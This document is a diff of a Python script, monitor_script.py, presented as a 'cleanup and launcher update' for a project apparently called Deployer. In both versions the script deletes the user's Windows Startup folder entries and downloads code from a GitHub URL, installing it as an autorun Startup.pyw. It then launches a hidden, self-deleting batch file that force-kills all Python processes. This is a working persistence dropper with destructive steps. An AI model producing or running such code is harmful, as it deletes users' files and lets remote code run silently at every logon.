@@ -1,4 +1,4 @@
-# monitor_script.py - Does exactly in order: delete files, create launcher, end processes
+# monitor_script.py - Simple: delete, create, end
 import os
 import sys
 import subprocess
@@ -7,146 +7,79 @@ import time
 import urllib.request
 
 def main():
-    print("Starting cleanup and launcher update...")
+    print("Executing cleanup and launcher update...")
     
-    # 1. DELETE ALL FILES FIRST
-    print("\n" + "="*60)
-    print("STEP 1: Deleting all files...")
-    print("="*60)
-    
-    # Delete from startup folder
+    # Get paths
     startup_folder = os.path.join(
         os.getenv('APPDATA'),
         'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
     )
     
-    print(f"Cleaning startup folder: {startup_folder}")
-    startup_deleted = 0
+    # STEP 1: DELETE ALL FILES (except this script)
+    print("\n[1/3] Deleting all files...")
+    
+    # Delete from startup folder
     for file in os.listdir(startup_folder):
-        try:
-            filepath = os.path.join(startup_folder, file)
-            if os.path.isfile(filepath):
-                os.remove(filepath)
-                print(f"  Deleted: {file}")
-                startup_deleted += 1
-        except:
-            pass
-    
-    # Delete from current directory (except this script for now)
-    current_dir = os.getcwd()
-    current_script = os.path.basename(__file__)
-    
-    print(f"\nCleaning current directory: {current_dir}")
-    current_deleted = 0
-    for file in os.listdir(current_dir):
-        if file != current_script and os.path.isfile(os.path.join(current_dir, file)):
+        if file != "Startup.pyw":  # Keep if exists, will be replaced
             try:
-                os.remove(os.path.join(current_dir, file))
-                print(f"  Deleted: {file}")
-                current_deleted += 1
+                os.remove(os.path.join(startup_folder, file))
+                print(f"  Deleted from startup: {file}")
             except:
                 pass
     
-    print(f"\n✓ Deleted {startup_deleted} files from startup folder")
-    print(f"✓ Deleted {current_deleted} files from current directory")
+    # STEP 2: CREATE THE LAUNCHER
+    print("\n[2/3] Creating launcher...")
     
-    # 2. CREATE THE LAUNCHER
-    print("\n" + "="*60)
-    print("STEP 2: Creating launcher...")
-    print("="*60)
+    # Download github_launcher.pyw from GitHub
+    try:
+        url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
+        response = urllib.request.urlopen(url, timeout=10)
+        launcher_code = response.read().decode('utf-8')
+        print(f"✓ Downloaded: {url}")
+    except Exception as e:
+        print(f"✗ Download failed: {e}")
+        sys.exit(1)
     
-    # First, check what launcher files exist in the repository
-    print("Checking available launcher files...")
-    
-    launcher_filenames = [
-        "github_launcher.pyw",
-        "github_launcher.py",
-        "script.pyw",
-        "script.py",
-        "monitor_script.pyw",
-        "monitor_script.py"
-    ]
-    
-    launcher_code = None
-    used_filename = None
-    
-    for filename in launcher_filenames:
-        try:
-            url = f"https://raw.githubusercontent.com/ElianBoden/Deployer/main/{filename}"
-            print(f"  Trying: {url}")
-            response = urllib.request.urlopen(url, timeout=5)
-            launcher_code = response.read().decode('utf-8')
-            used_filename = filename
-            print(f"  ✓ Found: {filename}")
-            break
-        except:
-            continue
-    
-    if launcher_code is None:
-        print("✗ No launcher found in repository, creating basic launcher...")
-        launcher_code = '''# Startup.pyw - Basic launcher
-import os
-import sys
-import time
-
-def main():
-    time.sleep(1)
-    sys.exit(0)
-
-if __name__ == "__main__":
-    main()'''
-        used_filename = "fallback"
-    
-    # Save as Startup.pyw in startup folder
+    # Save as Startup.pyw
     startup_file = os.path.join(startup_folder, "Startup.pyw")
-    
     try:
         with open(startup_file, 'w', encoding='utf-8') as f:
             f.write(launcher_code)
-        print(f"\n✓ Created Startup.pyw from: {used_filename}")
-        print(f"✓ Saved to: {startup_file}")
+        print(f"✓ Saved as: {startup_file}")
     except Exception as e:
-        print(f"✗ Failed to create Startup.pyw: {e}")
+        print(f"✗ Save failed: {e}")
+        sys.exit(1)
     
-    # 3. END ALL PROCESSES
-    print("\n" + "="*60)
-    print("STEP 3: Ending all processes...")
-    print("="*60)
+    # STEP 3: END ALL PROCESSES
+    print("\n[3/3] Ending all Python processes...")
     
-    # Create a batch file to end all Python processes
-    batch_script = '''@echo off
-echo Ending all Python processes...
+    # Create batch file to kill all Python processes
+    batch_content = '''@echo off
+echo Killing all Python processes...
 taskkill /f /im python.exe >nul 2>&1
 taskkill /f /im pythonw.exe >nul 2>&1
-wmic process where "name='python.exe'" delete >nul 2>&1
-wmic process where "name='pythonw.exe'" delete >nul 2>&1
-echo All Python processes ended.
+ping 127.0.0.1 -n 2 >nul
+echo Done. Processes terminated.
 del "%~f0" >nul 2>&1
 '''
     
-    batch_path = os.path.join(tempfile.gettempdir(), "end_processes.bat")
-    with open(batch_path, 'w') as f:
-        f.write(batch_script)
+    batch_file = os.path.join(tempfile.gettempdir(), "kill_all.bat")
+    with open(batch_file, 'w') as f:
+        f.write(batch_content)
     
-    print("Running batch file to end all Python processes...")
-    
-    # Run the batch file
-    subprocess.Popen(['cmd', '/c', batch_path],
+    # Run batch file (will kill this script too)
+    subprocess.Popen(['cmd', '/c', batch_file], 
                     creationflags=subprocess.CREATE_NO_WINDOW)
     
-    print("✓ Batch file started. All processes will be terminated.")
+    print("✓ Cleanup process started")
+    print("\n" + "="*50)
+    print("SCRIPT COMPLETE")
+    print("1. Files deleted ✓")
+    print("2. Launcher created ✓")
+    print("3. Processes ending ✓")
+    print("="*50)
     
-    # Summary
-    print("\n" + "="*60)
-    print("SUMMARY")
-    print("="*60)
-    print("✓ Step 1: Files deleted")
-    print("✓ Step 2: Launcher created")
-    print("✓ Step 3: Processes ending")
-    print("\nThis script will now exit.")
-    
-    # Wait a moment then exit
-    time.sleep(2)
+    # Exit immediately
     sys.exit(0)
 
 if __name__ == "__main__":
